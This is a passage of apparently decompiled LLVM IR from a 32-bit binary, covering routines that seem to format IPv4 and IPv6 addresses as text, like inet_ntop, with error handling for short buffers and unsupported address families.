  store i32 %v2_141f0, i32* %sb.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_141f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_141f8, i32* @r0, align 4
  br i1 %v7_141ec, label %dec_label_pc_14200, label %dec_label_pc_14228

dec_label_pc_14200:                               ; preds = %dec_label_pc_141c8
  %v0_14200 = call i32 @function_14f20()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14208 = urem i32 %v0_14200, 256
  %v2_1420c = call i32 @function_ca30(i32 %v1_14208, i32 10)
  %v1_14210 = add i32 %v2_1420c, 48
  %v1_14214 = trunc i32 %v1_14210 to i8
  %v2_14214 = load i32, i32* %r5.global-to-local, align 4
  %v3_14214 = add i32 %v2_14214, -17
  %v4_14214 = inttoptr i32 %v3_14214 to i8*
  store i8 %v1_14214, i8* %v4_14214, align 1
  %v0_14218 = load i32, i32* %r5.global-to-local, align 4
  %v1_14218 = add i32 %v0_14218, -17
  %v2_14218 = inttoptr i32 %v1_14218 to i8*
  %v3_14218 = load i8, i8* %v2_14218, align 1
  %v7_1421c = icmp eq i8 %v3_14218, 48
  br i1 %v7_1421c, label %dec_label_pc_1424c, label %bb

bb:                                               ; preds = %dec_label_pc_14200
  %v1_14220 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14220, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1424c

dec_label_pc_14228:                               ; preds = %dec_label_pc_141c8
  store i32 10, i32* @r1, align 4
  store i32 %v0_141f8, i32* @r0, align 4
  %v0_14230 = call i32 @function_14f20()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14238 = urem i32 %v0_14230, 256
  %v2_1423c = call i32 @function_ca30(i32 %v1_14238, i32 10)
  %v1_14240 = add i32 %v2_1423c, 48
  %v1_14244 = trunc i32 %v1_14240 to i8
  %v2_14244 = load i32, i32* %sl.global-to-local, align 4
  %v3_14244 = add i32 %v2_14244, -17
  %v4_14244 = inttoptr i32 %v3_14244 to i8*
  store i8 %v1_14244, i8* %v4_14244, align 1
  %v0_14248 = load i32, i32* %r7.global-to-local, align 4
  %v1_14248 = add i32 %v0_14248, 1
  store i32 %v1_14248, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1424c

dec_label_pc_1424c:                               ; preds = %bb, %dec_label_pc_14200, %dec_label_pc_14228
  %v0_1424c = load i32, i32* %sb.global-to-local, align 4
  %v1_1424c = inttoptr i32 %v0_1424c to i8*
  %v2_1424c = load i8, i8* %v1_1424c, align 1
  %v3_1424c = zext i8 %v2_1424c to i32
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_14254 = call i32 @function_ca30(i32 %v3_1424c, i32 10)
  store i32 %v2_14280, i32* %ip.global-to-local, align 4
  %v1_1425c = load i32, i32* %r6.global-to-local, align 4
  %v1_14260 = add i32 %v1_1425c, 1
  store i32 %v1_14260, i32* %r1.global-to-local, align 4
  %v1_14264 = add i32 %v2_14254, 48
  %v1_14268 = trunc i32 %v1_14264 to i8
  %v3_14268 = add i32 %v2_1425c, %v1_1425c
  %v4_14268 = inttoptr i32 %v3_14268 to i8*
  store i8 %v1_14268, i8* %v4_14268, align 1
  %v0_1426c = load i32, i32* %ip.global-to-local, align 4
  %v1_1426c = load i32, i32* %r1.global-to-local, align 4
  %v2_1426c = add i32 %v1_1426c, %v0_1426c
  store i32 %v2_1426c, i32* %r2.global-to-local, align 4
  %v3_14274 = add i32 %v2_1426c, -17
  %v4_14274 = inttoptr i32 %v3_14274 to i8*
  store i8 46, i8* %v4_14274, align 1
  %v0_14278 = load i32, i32* %r8.global-to-local, align 4
  %v1_14278 = add i32 %v0_14278, 1
  store i32 %v1_14278, i32* %r8.global-to-local, align 4
  %v0_1427c = load i32, i32* %r1.global-to-local, align 4
  %v1_1427c = add i32 %v0_1427c, 1
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14188, %dec_label_pc_1424c
  %v0_141cc = phi i32 [ 0, %dec_label_pc_14188 ], [ %v1_1427c, %dec_label_pc_1424c ]
  %v1_141c8 = phi i32 [ 0, %dec_label_pc_14188 ], [ %v1_14278, %dec_label_pc_1424c ]
  store i32 %v2_14280, i32* %r2.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_141cc, i32* %r6.global-to-local, align 4
  %v2_14290 = add i32 %v0_141cc, %v2_14280
  store i32 %v2_14290, i32* %r5.global-to-local, align 4
  %v7_14294 = icmp sgt i32 %v1_141c8, 3
  br i1 %v7_14294, label %dec_label_pc_14298, label %dec_label_pc_141c8

dec_label_pc_14298:                               ; preds = %dec_label_pc_14280
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_141a4, i32* %r4.global-to-local, align 4
  %v3_142a0 = add i32 %v2_14290, -18
  %v4_142a0 = inttoptr i32 %v3_142a0 to i8*
  store i8 0, i8* %v4_142a0, align 1
  store i32 %v2_141a4, i32* @r0, align 4
  %v0_142a8 = call i32 @function_f030()
  %v2_142ac = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v0_142a8, %v2_142ac
  br i1 %tmp, label %dec_label_pc_142b8, label %dec_label_pc_142cc

dec_label_pc_142b8:                               ; preds = %dec_label_pc_14298
  %v0_142b8 = call i32 @function_cec4()
  %v0_142c0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_142c0, i32* %r2.global-to-local, align 4
  %v2_142c4 = inttoptr i32 %v0_142b8 to i32*
  store i32 28, i32* %v2_142c4, align 4
  %v0_142dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_142dc

dec_label_pc_142cc:                               ; preds = %dec_label_pc_14298
  store i32 %v2_141a4, i32* %r1.global-to-local, align 4
  %v2_142d4 = bitcast i32* %stack_var_-53 to i8*
  %v3_142d4 = call i32 @function_f090(i32 %arg2, i8* %v2_142d4)
  store i32 %v3_142d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142b8, %dec_label_pc_142cc
  %v0_142dc = phi i32 [ %v0_142dc.pre, %dec_label_pc_142b8 ], [ %v3_142d4, %dec_label_pc_142cc ]
  %v2_142e4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_142e4, i32* @r4, align 4
  ret i32 %v0_142dc

; uselistorder directives
  uselistorder i32 %v1_141c8, { 1, 0 }
  uselistorder i32 %v0_141cc, { 0, 2, 1 }
  uselistorder i32 %v2_14280, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @function_ca30, { 10, 9, 8, 6, 5, 4, 3, 2, 1, 7, 0 }
  uselistorder i8 48, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_142dc, { 1, 0 }
  uselistorder label %dec_label_pc_14280, { 1, 0 }
  uselistorder label %dec_label_pc_1424c, { 2, 0, 1 }
}

define i32 @function_142ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_142ec:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_142ec = load i32, i32* @r4, align 4
  store i32 %v3_142ec, i32* %stack_var_-32, align 4
  %v6_142ec = load i32, i32* @r5, align 4
  %v25_142ec = ptrtoint i32* %stack_var_-32 to i32
  %v7_142f0 = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_142f0, label %dec_label_pc_14314, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142ec
  %v7_14308 = icmp eq i32 %arg1, 10
  br i1 %v7_14308, label %dec_label_pc_14328, label %dec_label_pc_14528

dec_label_pc_14314:                               ; preds = %dec_label_pc_142ec
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_14320 = call i32 @function_14188(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_14520

dec_label_pc_14328:                               ; preds = %dec_label_pc_14308
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_14334 = bitcast i32* %stack_var_-64 to i8*
  %v3_14334 = call i32 @function_ef70(i8* %v2_14334, i32 0)
  br label %dec_label_pc_14354

dec_label_pc_14340:                               ; preds = %dec_label_pc_14354
  %tmp68 = icmp slt i32 %v1_14344, 0
  %v4_14354 = zext i1 %tmp68 to i32
  %v5_14354 = add i32 %v4_14354, %v1_14344
  %v3_14358 = sdiv i32 %v5_14354, 2
  %v4_14368 = mul i32 %v3_14358, 4
  %v5_14368 = add i32 %v4_14368, %v25_142ec
  %v1_14340 = add i32 %v2_14364, 1
  %v2_14340 = inttoptr i32 %v1_14340 to i8*
  %v3_14340 = load i8, i8* %v2_14340, align 1
  %v4_14340 = zext i8 %v3_14340 to i32
  %v3_14344 = inttoptr i32 %v2_14364 to i8*
  %v4_14344 = load i8, i8* %v3_14344, align 1
  %v6_14344 = zext i8 %v4_14344 to i32
  store i32 %v6_14344, i32* %r2.global-to-local, align 4
  %v4_14348 = mul nuw nsw i32 %v6_14344, 256
  %v5_14348 = or i32 %v4_14348, %v4_14340
  %v2_1434c = add i32 %v5_14368, -32
  %v3_1434c = inttoptr i32 %v2_1434c to i32*
  store i32 %v5_14348, i32* %v3_1434c, align 4
  %v0_14350 = load i32, i32* %r1.global-to-local, align 4
  %v1_14350 = add i32 %v0_14350, 2
  br label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_14328, %dec_label_pc_14340
  %v1_14344 = phi i32 [ 0, %dec_label_pc_14328 ], [ %v1_14350, %dec_label_pc_14340 ]
  store i32 %v1_14344, i32* %r1.global-to-local, align 4
  %v0_14364 = load i32, i32* @r8, align 4
  %v2_14364 = add i32 %v0_14364, %v1_14344
  store i32 %v2_14364, i32* %r2.global-to-local, align 4
  %v7_1436c = icmp sgt i32 %v1_14344, 15
  br i1 %v7_1436c, label %dec_label_pc_14370, label %dec_label_pc_14340

dec_label_pc_14370:                               ; preds = %dec_label_pc_14354
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14380

dec_label_pc_14380:                               ; preds = %dec_label_pc_14370, %dec_label_pc_143cc
  %v0_143c0 = phi i32 [ -1, %dec_label_pc_14370 ], [ %v0_143f4, %dec_label_pc_143cc ]
  %v0_143b0 = phi i32 [ -1, %dec_label_pc_14370 ], [ %v0_143e0, %dec_label_pc_143cc ]
  %v0_14394 = phi i32 [ -1, %dec_label_pc_14370 ], [ %v0_143948, %dec_label_pc_143cc ]
  %v0_143cc = phi i32 [ 0, %dec_label_pc_14370 ], [ %v1_143cc, %dec_label_pc_143cc ]
  %v4_14384 = mul nuw nsw i32 %v0_143cc, 4
  %v5_14384 = add i32 %v4_14384, %v25_142ec
  %v1_14388 = add i32 %v5_14384, -32
  %v2_14388 = inttoptr i32 %v1_14388 to i32*
  %v3_14388 = load i32, i32* %v2_14388, align 4
  %v2_1438c = icmp eq i32 %v3_14388, 0
  %v7_14394 = icmp eq i32 %v0_14394, -1
  br i1 %v2_1438c, label %dec_label_pc_14394, label %dec_label_pc_143a8

dec_label_pc_14394:                               ; preds = %dec_label_pc_14380
  br i1 %v7_14394, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14394
  store i32 %v0_143cc, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_143cc

.thread:                                          ; preds = %dec_label_pc_14394
  %v1_143a0.pre = load i32, i32* @r4, align 4
  %v2_143a0 = add i32 %v1_143a0.pre, 1
  store i32 %v2_143a0, i32* @r4, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14380
  br i1 %v7_14394, label %dec_label_pc_143cc, label %dec_label_pc_143b0

dec_label_pc_143b0:                               ; preds = %dec_label_pc_143a8
  %v7_143b0 = icmp eq i32 %v0_143b0, -1
  %v0_143c4.pre = load i32, i32* @r4, align 4
  %v1_143b8 = load i32, i32* @r7, align 4
  %v7_143bc = icmp sgt i32 %v0_143c4.pre, %v1_143b8
  %or.cond = or i1 %v7_143b0, %v7_143bc
  br i1 %or.cond, label %dec_label_pc_143c0, label %dec_label_pc_143c8

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143b0
  store i32 %v0_143c0, i32* @r6, align 4
  store i32 %v0_143c4.pre, i32* @r7, align 4
  br label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %dec_label_pc_143b0, %dec_label_pc_143c0
  %v0_143b013 = phi i32 [ %v0_143c0, %dec_label_pc_143c0 ], [ %v0_143b0, %dec_label_pc_143b0 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143cc:                               ; preds = %bb, %.thread, %dec_label_pc_143a8, %dec_label_pc_143c8
  %v0_143f4 = phi i32 [ %v0_143c0, %.thread ], [ %v0_143cc, %bb ], [ %v0_143c0, %dec_label_pc_143a8 ], [ -1, %dec_label_pc_143c8 ]
  %v0_143948 = phi i32 [ %v0_14394, %.thread ], [ %v0_143cc, %bb ], [ -1, %dec_label_pc_143a8 ], [ -1, %dec_label_pc_143c8 ]
  %v0_143e0 = phi i32 [ %v0_143b0, %.thread ], [ %v0_143b0, %bb ], [ %v0_143b0, %dec_label_pc_143a8 ], [ %v0_143b013, %dec_label_pc_143c8 ]
  %v1_143cc = add nuw nsw i32 %v0_143cc, 1
  store i32 %v1_143cc, i32* %r1.global-to-local, align 4
  %v7_143d4 = icmp slt i32 %v1_143cc, 8
  br i1 %v7_143d4, label %dec_label_pc_14380, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143cc
  %v7_143d8 = icmp eq i32 %v0_143f4, -1
  br i1 %v7_143d8, label %dec_label_pc_143f8, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143d8
  %v7_143e0 = icmp eq i32 %v0_143e0, -1
  %v0_143f0.pre = load i32, i32* @r4, align 4
  br i1 %v7_143e0, label %dec_label_pc_143f0, label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143e0
  %v1_143e8 = load i32, i32* @r7, align 4
  %v7_143ec = icmp sgt i32 %v0_143f0.pre, %v1_143e8
  br i1 %v7_143ec, label %dec_label_pc_143f0, label %dec_label_pc_143f8

dec_label_pc_143f0:                               ; preds = %dec_label_pc_143e0, %dec_label_pc_143e8
  store i32 %v0_143f0.pre, i32* @r7, align 4
  store i32 %v0_143f4, i32* @r6, align 4
  br label %dec_label_pc_143f8

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143e8, %dec_label_pc_143d8, %dec_label_pc_143f0
  %v0_143f8 = phi i32 [ %v0_143e0, %dec_label_pc_143e8 ], [ %v0_143e0, %dec_label_pc_143d8 ], [ %v0_143f4, %dec_label_pc_143f0 ]
  %v7_143f8 = icmp eq i32 %v0_143f8, -1
  br i1 %v7_143f8, label %bb49, label %dec_label_pc_14400

dec_label_pc_14400:                               ; preds = %dec_label_pc_143f8
  %v0_14400 = load i32, i32* @r7, align 4
  %v7_14404 = icmp slt i32 %v0_14400, 2
  br i1 %v7_14404, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_14400
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_143f8, %dec_label_pc_14400, %bb48
  %v0_1441423 = phi i32 [ %v0_143f8, %dec_label_pc_143f8 ], [ %v0_143f8, %dec_label_pc_14400 ], [ -1, %bb48 ]
  %v2_14408 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_14408, i32* @r4, align 4
  %v9_14474 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1441463 = icmp eq i32 %v0_1441423, -1
  br label %dec_label_pc_14414

dec_label_pc_14414:                               ; preds = %bb49, %dec_label_pc_144c8
  %v7_1441467 = phi i1 [ %v7_1441463, %bb49 ], [ %v7_14414, %dec_label_pc_144c8 ]
  %v0_1444066 = phi i32 [ 0, %bb49 ], [ %v1_144c8, %dec_label_pc_144c8 ]
  %v1_1443065 = phi i32 [ %v0_1441423, %bb49 ], [ %v0_14414.pre, %dec_label_pc_144c8 ]
  %v3_1444864 = phi i32 [ %v2_14408, %bb49 ], [ %v3_1443824, %dec_label_pc_144c8 ]
  br i1 %v7_1441467, label %dec_label_pc_14440, label %dec_label_pc_1441c

dec_label_pc_1441c:                               ; preds = %dec_label_pc_14414
  %v9_1441c = icmp eq i32 %v0_1444066, %v1_1443065
  %v5_14420 = icmp slt i32 %v0_1444066, %v1_1443065
  br i1 %v5_14420, label %dec_label_pc_14440, label %dec_label_pc_14424

dec_label_pc_14424:                               ; preds = %dec_label_pc_1441c
  %v1_14424 = load i32, i32* @r7, align 4
  %v2_14424 = add i32 %v1_14424, %v1_1443065
  %v6_1442c = icmp slt i32 %v0_1444066, %v2_14424
  br i1 %v6_1442c, label %dec_label_pc_14430, label %dec_label_pc_14440

dec_label_pc_14430:                               ; preds = %dec_label_pc_14424
  br i1 %v9_1441c, label %bb51, label %dec_label_pc_144c8

bb51:                                             ; preds = %dec_label_pc_14430
  %v4_14438 = inttoptr i32 %v3_1444864 to i8*
  store i8 58, i8* %v4_14438, align 1
  %v5_14438 = load i32, i32* @r4, align 4
  %v6_14438 = add i32 %v5_14438, 1
  store i32 %v6_14438, i32* @r4, align 4
  br label %dec_label_pc_144c8

dec_label_pc_14440:                               ; preds = %dec_label_pc_14424, %dec_label_pc_1441c, %dec_label_pc_14414
  %v2_14440 = icmp eq i32 %v0_1444066, 0
  br i1 %v2_14440, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_14440
  %v4_14448 = inttoptr i32 %v3_1444864 to i8*
  store i8 58, i8* %v4_14448, align 1
  %v5_14448 = load i32, i32* @r4, align 4
  %v6_14448 = add i32 %v5_14448, 1
  store i32 %v6_14448, i32* @r4, align 4
  %v0_1444c.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14440, %bb52
  %v0_1448c = phi i32 [ %v3_1444864, %dec_label_pc_14440 ], [ %v6_14448, %bb52 ]
  %v1_144b0 = phi i32 [ 0, %dec_label_pc_14440 ], [ %v0_1444c.pre, %bb52 ]
  %v7_1444c = icmp eq i32 %v1_144b0, 6
  br i1 %v7_1444c, label %dec_label_pc_14454, label %dec_label_pc_144ac

dec_label_pc_14454:                               ; preds = %.thread3
  %v0_14454 = load i32, i32* @r6, align 4
  %v2_14454 = icmp eq i32 %v0_14454, 0
  br i1 %v2_14454, label %dec_label_pc_1445c, label %dec_label_pc_144ac

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14454
  %v0_1445c = load i32, i32* @r7, align 4
  %v7_1445c = icmp eq i32 %v0_1445c, 6
  br i1 %v7_1445c, label %dec_label_pc_1447c, label %dec_label_pc_14464

dec_label_pc_14464:                               ; preds = %dec_label_pc_1445c
  %v7_14464 = icmp eq i32 %v0_1445c, 5
  br i1 %v7_14464, label %dec_label_pc_1446c, label %dec_label_pc_144ac

dec_label_pc_1446c:                               ; preds = %dec_label_pc_14464
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_14474, label %dec_label_pc_1447c, label %dec_label_pc_144ac

dec_label_pc_1447c:                               ; preds = %dec_label_pc_1446c, %dec_label_pc_1445c
  %v2_14480 = sub i32 %v25_142ec, %v0_1448c
  %v0_14484 = load i32, i32* @r8, align 4
  %v1_14484 = add i32 %v0_14484, 12
  %v1_14488 = add i32 %v2_14480, -32
  store i32 %v1_14488, i32* %r2.global-to-local, align 4
  store i32 %v0_1448c, i32* %r1.global-to-local, align 4
  %v3_14490 = call i32 @function_14188(i32 %v1_14484, i32 %v0_1448c, i32 %v1_14488)
  %v2_14494 = icmp eq i32 %v3_14490, 0
  br i1 %v2_14494, label %dec_label_pc_14520, label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %dec_label_pc_1447c
  %v0_1449c = load i32, i32* @r4, align 4
  store i32 %v0_1449c, i32* @r0, align 4
  %v0_144a0 = call i32 @function_f030()
  %v0_144a4 = load i32, i32* @r4, align 4
  %v2_144a4 = add i32 %v0_144a4, %v0_144a0
  store i32 %v2_144a4, i32* @r4, align 4
  %v0_144dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_144dc

dec_label_pc_144ac:                               ; preds = %dec_label_pc_1446c, %dec_label_pc_14464, %dec_label_pc_14454, %.thread3
  %v4_144b0 = mul i32 %v1_144b0, 4
  %v5_144b0 = add i32 %v4_144b0, %v25_142ec
  store i32 %v0_1448c, i32* @r0, align 4
  %v1_144b8 = add i32 %v5_144b0, -32
  %v2_144b8 = inttoptr i32 %v1_144b8 to i32*
  %v3_144b8 = load i32, i32* %v2_144b8, align 4
  store i32 %v3_144b8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_181a0.627 to i32), i32* %r1.global-to-local, align 4
  %v4_144c0 = call i32 @function_d06c(i32 %v0_1448c, i32 ptrtoint ([3 x i8]* @global_var_181a0.627 to i32), i32 %v3_144b8)
  %v0_144c4 = load i32, i32* @r4, align 4
  %v2_144c4 = add i32 %v0_144c4, %v4_144c0
  store i32 %v2_144c4, i32* @r4, align 4
  br label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_14430, %bb51, %dec_label_pc_144ac
  %v3_1443824 = phi i32 [ %v3_1444864, %dec_label_pc_14430 ], [ %v6_14438, %bb51 ], [ %v2_144c4, %dec_label_pc_144ac ]
  %v0_144c8 = load i32, i32* @r5, align 4
  %v1_144c8 = add i32 %v0_144c8, 1
  %v0_14414.pre = load i32, i32* @r6, align 4
  store i32 %v1_144c8, i32* @r5, align 4
  %v7_144d0 = icmp slt i32 %v1_144c8, 8
  %v7_14414 = icmp eq i32 %v0_14414.pre, -1
  br i1 %v7_144d0, label %dec_label_pc_14414, label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_144c8
  br i1 %v7_14414, label %.thread4, label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %dec_label_pc_144d4, %dec_label_pc_1449c
  %v3_144e8 = phi i32 [ %v3_1443824, %dec_label_pc_144d4 ], [ %v2_144a4, %dec_label_pc_1449c ]
  %v0_144dc = phi i32 [ %v0_14414.pre, %dec_label_pc_144d4 ], [ %v0_144dc.pre, %dec_label_pc_1449c ]
  %v1_144dc = load i32, i32* @r7, align 4
  %v2_144dc = add i32 %v1_144dc, %v0_144dc
  %v7_144e0 = icmp eq i32 %v2_144dc, 8
  br i1 %v7_144e0, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_144dc
  %v4_144e8 = inttoptr i32 %v3_144e8 to i8*
  store i8 58, i8* %v4_144e8, align 1
  %v5_144e8 = load i32, i32* @r4, align 4
  %v6_144e8 = add i32 %v5_144e8, 1
  store i32 %v6_144e8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_144dc, %dec_label_pc_144d4, %bb53
  %v2_144f0 = phi i32 [ %v3_144e8, %dec_label_pc_144dc ], [ %v3_1443824, %dec_label_pc_144d4 ], [ %v6_144e8, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_144f0 = inttoptr i32 %v2_144f0 to i8*
  store i8 0, i8* %v3_144f0, align 1
  %v4_144f0 = load i32, i32* @r4, align 4
  %v5_144f0 = add i32 %v4_144f0, 1
  store i32 %v2_14408, i32* %r1.global-to-local, align 4
  %v2_144f8 = sub i32 %v5_144f0, %v2_14408
  %v1_144fc = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_144f8, %v1_144fc
  br i1 %tmp69, label %dec_label_pc_14504, label %dec_label_pc_14518

dec_label_pc_14504:                               ; preds = %.thread4
  %v0_14504 = call i32 @function_cec4()
  %v0_1450c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1450c, i32* %r2.global-to-local, align 4
  %v2_14510 = inttoptr i32 %v0_14504 to i32*
  store i32 28, i32* %v2_14510, align 4
  %v0_14538.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14538

dec_label_pc_14518:                               ; preds = %.thread4
  %v0_14518 = load i32, i32* @sb, align 4
  %v2_1451c = bitcast i32* %stack_var_-110 to i8*
  %v3_1451c = call i32 @function_f090(i32 %v0_14518, i8* %v2_1451c)
  br label %dec_label_pc_14520

dec_label_pc_14520:                               ; preds = %dec_label_pc_1447c, %dec_label_pc_14314, %dec_label_pc_14518
  %v0_14520 = phi i32 [ 0, %dec_label_pc_1447c ], [ %v3_14320, %dec_label_pc_14314 ], [ %v3_1451c, %dec_label_pc_14518 ]
  store i32 %v0_14520, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14538

dec_label_pc_14528:                               ; preds = %dec_label_pc_14308
  %v0_14528 = call i32 @function_cec4()
  %v2_14530 = inttoptr i32 %v0_14528 to i32*
  store i32 97, i32* %v2_14530, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14538

dec_label_pc_14538:                               ; preds = %dec_label_pc_14520, %dec_label_pc_14504, %dec_label_pc_14528
  %v0_14538 = phi i32 [ %v0_14520, %dec_label_pc_14520 ], [ %v0_14538.pre, %dec_label_pc_14504 ], [ 0, %dec_label_pc_14528 ]
  store i32 %v6_142ec, i32* %r5.global-to-local, align 4
  ret i32 %v0_14538

; uselistorder directives
  uselistorder i1 %v7_14414, { 1, 0 }
  uselistorder i32 %v0_14414.pre, { 1, 0, 2 }
  uselistorder i32 %v1_144c8, { 1, 0, 2 }
  uselistorder i32 %v0_1448c, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1444864, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1443065, { 2, 0, 1 }
  uselistorder i32 %v0_1444066, { 3, 2, 0, 1 }
  uselistorder i32 %v2_14408, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1441423, { 1, 0 }
  uselistorder i32 %v0_143f8, { 1, 2, 0 }
  uselistorder i32 %v1_143cc, { 1, 2, 0 }
  uselistorder i32 %v0_143e0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_143f4, { 1, 2, 0, 3 }
  uselistorder i1 %v7_14394, { 1, 0 }
  uselistorder i32 %v0_143cc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_143b0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_143c0, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14364, { 2, 1, 0 }
  uselistorder i32 %v1_14344, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_142ec, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 2, 3, 6, 0, 1, 7, 4, 5 }
  uselistorder i32 (i32, i8*)* @function_f090, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_d06c, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_ef70, { 0, 1, 10, 6, 7, 8, 15, 13, 14, 9, 2, 3, 4, 5, 11, 12 }
  uselistorder i32 (i32, i32, i32)* @function_14188, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_14538, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14520, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_144c8, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14414, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_143f0, { 1, 0 }
  uselistorder label %dec_label_pc_143cc, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_143c8, { 1, 0 }
  uselistorder label %dec_label_pc_14380, { 1, 0 }
  uselistorder label %dec_label_pc_14354, { 1, 0 }
}

define i32 @function_1454c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1454c:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
